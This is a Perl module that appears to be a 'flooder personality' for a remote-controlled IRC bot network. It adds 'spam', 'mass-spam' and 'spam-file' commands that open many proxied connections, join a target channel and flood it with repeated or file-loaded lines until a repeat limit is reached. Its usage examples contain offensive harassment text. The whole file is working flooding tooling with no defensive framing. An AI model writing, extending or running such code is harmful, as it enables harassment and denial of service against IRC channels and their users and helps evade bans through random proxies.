# This is a very basic flooder personality. Adds the commands "spam" and "mass-spam"

package IRC::RemoteControl::Personality::Flood;

use Moose::Role;
use AnyEvent;

has 'flood_text' => (
    is => 'rw',
    isa => 'ArrayRef',
);

# register spam and mass-spam commands
after 'setup' => sub {
    my ($self) = @_;

    $self->register_command('spam' => \&spam_cmd_handler);
    $self->register_command('mass-spam' => \&spam_cmd_handler);
    $self->register_command('spam-file' => \&spam_file_handler);
};

# join channel after registering
after 'registered' => sub {
    my ($self, $conn) = @_;

    $conn->{flood_register_handler}->($self, $conn);
};

sub spam_file_handler {
    my ($self, $h, $cmd, $args) = @_;

    my ($chan, $file) = $args =~ /^(#\S+)\s+(.+)/i;
    unless ($chan && $file) {
        return $h->push_write("Usage: spam-file #anxious /usr/ta/supernazi.txt\n");
    }

    # slurp file
    return $h->push_write("$file does not exist\n") unless -e $file;
    my @text = $self->slurp($file);

    return $h->push_write("$file is empty or could not be read\n") unless @text;
    $self->flood_text(\@text);

    $self->mass_spam($chan);
}

sub spam_cmd_handler {
    my ($self, $h, $cmd, $args) = @_;

    my ($mass, $chan, $text) = "$cmd $args" =~ /^(mass-)?spam(?:\s+(#\S+)\s+(.+))/i;
    unless ($chan && $text) {
        return $h->push_write("Usage: spam #anxious MAN IN A DRESS HERE\n");
    }

    my $conn;
    if ($mass) {
        $conn = $self->mass_spam($chan, $text);
    } else {
        $conn = $self->spam($chan, $text);
    }
}

sub mass_spam {
    my ($self, $chan, $text) = @_;

    my $i = 1;
    while (my $conn = $self->spam($chan, $text, $i++)) {
        $self->h->push_write("Spamming $chan\n");
    }
}

# connect one bot and spam
sub spam {
    my ($self, $chan, $text, $num) = @_;
    
    my $proxy = $self->get_random_proxy;
    my $conn = $self->connect($chan, $text, $proxy);
    return unless $conn;

    $conn->{flood_register_handler} = sub {
        my ($self, $conn) = @_;

        $conn->{flood_connection_num} = $num || 0;
        $conn->{flood_text}{$chan} = $text;

        # join channel
        $conn->send_msg(JOIN => $chan);
    };

    return $conn;
}

# connection joined channel
after 'joined' => sub {
    my ($self, $conn, $nick, $chan, $is_me) = @_;

    return unless $is_me;

    my $num = $conn->{flood_connection_num};

    my $disconnect = sub {
        delete $conn->{flood_timer};
        delete $conn->{flood_repeat_count}{$chan};
        $conn->disconnect;
    };

    my $get_line = sub {
        my $text;

        if ($self->flood_text && @{ $self->flood_text }) {
            $text = shift @{ $self->flood_text };
        } else {
            $text = $conn->{flood_text}{$chan};
        }

        return $text;
    };

    $conn->{flood_repeat_count}{$chan} = 1;

    my $make_timer;
    $make_timer = sub {
        my $delay = 0.2 + $num / 2.0;
        $delay += 2 if $conn->{flood_repeat_count}{$chan} > 4;

        $conn->{flood_timer} = AnyEvent->timer(
            after => $delay,
            cb => sub {
                my $text = $get_line->();

                # AnyEvent::IRC won't send empty lines, this will cause the sent handler to not be fired
                if (defined $text && $text =~ /^\n/) {
                    $make_timer->();
                }

                if (! defined $text || 
                    (! $self->flood_text && $conn->{flood_repeat_count}{$chan}++ >= $self->repeat_count) ){
                    # disconnect if repeat count reached or flood text buffer is empty

                    $disconnect->();
                    return;
                }

                $conn->send_long_message('utf-8', 0, "PRIVMSG", $chan, $text);
            },
        );
    };

    $conn->reg_cb(sent => $make_timer);
    $make_timer->();
};

1;
